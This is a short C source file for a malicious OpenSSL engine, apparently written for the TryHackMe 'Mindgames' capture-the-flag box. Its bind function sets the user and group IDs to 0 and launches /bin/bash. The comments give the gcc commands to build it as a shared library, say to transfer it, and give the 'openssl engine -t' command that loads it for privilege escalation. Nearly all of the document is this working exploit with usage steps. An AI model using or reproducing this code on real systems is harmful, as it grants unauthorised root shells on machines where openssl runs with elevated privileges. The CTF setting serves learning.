/*
Minimal C openssl engine code

#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  return 1;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
*/


#include <openssl/engine.h>
#include <unistd.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0);
  setgid(0);
  system("/bin/bash");
}


IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()

/*
Compile

gcc -fPIC -o openssl_setuid.o -c openssl_setuid.c
gcc -shared -o openssl_setuid.so -lcrypto openssl_setuid.o

Transfer the .so file
run with
openssl engine -t `pwd`/openssl_setuid.so

https://blog.hydrashead.net/posts/thm-mindgames/

*/